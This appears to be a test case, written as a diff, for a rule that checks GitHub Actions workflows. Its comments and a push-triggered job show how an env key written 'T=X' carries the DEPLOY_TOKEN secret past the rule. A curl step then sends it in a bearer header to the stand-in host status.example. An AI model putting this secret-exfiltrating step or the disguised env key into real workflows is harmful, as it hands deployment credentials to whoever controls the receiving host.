@@ -1,0 +1,19 @@
+# situation: on push, a step has the env key T=X with the secret DEPLOY_TOKEN,
+#   and sends $T in a header to a host that the workflow writes.
+# reason: a todo (the same file): the runner sets the variable T to X= and
+#   the secret, so the request carries the secret to the host.
+# cause: the rule reads a variable of env by a key equal to its name, and
+#   no key is T.
+# attack: the one who controls the host reads the header.
+# attack-run-behavior: curl sends Authorization: Bearer X= and the value of
+#   DEPLOY_TOKEN to status.example.
+on: push
+permissions: {}
+jobs:
+  a:
+    runs-on: ubuntu-latest
+    steps:
+      - env:
+          T=X: ${{ secrets.DEPLOY_TOKEN }}
+        run: |
+          curl -fsS -H "Authorization: Bearer $T" "https://status.example/deploy"
